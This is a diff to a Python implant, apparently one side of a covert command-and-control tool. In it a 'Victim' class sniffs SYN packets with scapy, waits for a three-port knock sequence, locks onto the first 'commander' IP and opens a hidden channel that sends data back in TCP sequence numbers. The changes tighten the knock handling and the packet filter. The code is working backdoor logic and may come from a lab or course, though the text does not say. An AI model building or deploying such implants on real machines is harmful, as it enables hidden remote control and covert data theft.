@@ -76,39 +76,51 @@ class Victim:
         self.temp_rx = None
         self.knock_source_ip = None
         self.last_knock_time = 0
-        
+        self.sequence_locked = False  # Lock sequence to first commander IP
+    
         def process_knock(pkt):
+            # Don't return anything - scapy prints return values!
             if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
-                return False
+                return None
             
-            if not pkt[TCP].flags & 0x02:
-                return False
+            if not pkt[TCP].flags & 0x02:  # Check SYN flag
+                return None
             
             dport = pkt[TCP].dport
             src_ip = pkt[IP].src
             victim_ip = pkt[IP].dst
             
+            # Check if enough time has passed to reset (60 second window)
             current_time = time.time()
-            if current_time - self.last_knock_time > 30:
+            if current_time - self.last_knock_time > 60:
                 if self.knock_state > 0:
                     print(f"[!] Timeout - resetting knock sequence")
                 self.knock_state = 0
                 self.expected_knocks = []
+                self.sequence_locked = False
             
             self.last_knock_time = current_time
             
+            # If we haven't generated expected sequence yet, do it now
             if not self.expected_knocks:
                 res = self._generate_expected_sequence(victim_ip)
                 if res:
                     self.expected_knocks, self.temp_tx, self.temp_rx = res
+                    self.knock_source_ip = src_ip  # Lock to this IP
+                    self.sequence_locked = True
                     print(f"[*] Expected ports: {self.expected_knocks}")
+                    print(f"[*] Covert TX/RX: {self.temp_tx}/{self.temp_rx}")
                 else:
-                    return False
+                    return None
 
+            # Only accept knocks from the same IP that triggered sequence generation
+            if self.sequence_locked and src_ip != self.knock_source_ip:
+                return None
+
+            # Check if port matches current expected knock
             if dport == self.expected_knocks[self.knock_state]:
                 self.knock_state += 1
-                self.knock_source_ip = src_ip
-                print(f"[*] Knock {self.knock_state}/3 on port {dport}")
+                print(f"[*] Knock {self.knock_state}/3 on port {dport} from {src_ip}")
                 
                 if self.knock_state >= 3:
                     self.commander_ip = src_ip
@@ -117,20 +129,22 @@ class Victim:
                     self.is_connected = True
                     print(f"\n[+] Session Established with {self.commander_ip}")
                     print(f"[+] Covert Ports: TX={self.tx_port}, RX={self.rx_port}")
-                    return True
+                    return True  # This one is OK - it's for stop_filter
             else:
-                if self.knock_state > 0:
-                    print(f"[!] Wrong port {dport}. Resetting.")
+                # Only reset if it's not a duplicate of current or previous knock
+                if self.knock_state > 0 and dport not in self.expected_knocks[:self.knock_state]:
+                    print(f"[!] Wrong port {dport}, expected {self.expected_knocks[self.knock_state]}. Resetting.")
                     self.knock_state = 0
             
-            return False
+            return None  # Don't print False!
 
+        # Use a more specific filter - only SYN packets to high ports
         sniff(
-            filter="tcp[tcpflags] & tcp-syn != 0", 
+            filter="tcp[tcpflags] & tcp-syn != 0 and tcp dst portrange 1024-65535", 
             prn=process_knock, 
             stop_filter=lambda x: self.is_connected,
             store=0
-        )
+        )    
 
     def send_covert_response(self, message):
         """Sends data back to Commander using TCP Sequence Numbers."""
